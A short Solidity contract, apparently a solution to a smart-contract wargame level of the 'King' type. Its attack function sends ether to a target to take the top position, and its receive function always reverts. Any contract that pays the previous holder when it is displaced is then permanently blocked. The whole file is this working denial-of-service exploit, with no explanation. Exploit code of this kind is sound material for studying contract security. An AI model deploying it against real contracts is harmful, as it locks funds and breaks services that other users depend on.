// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.0;

contract KingAttack {
    function attack(address payable target) external payable {
        (bool success,) = target.call.value(msg.value)('');
        require(success, 'ether send failed');
    }

    receive() external payable {
        revert();
    }
}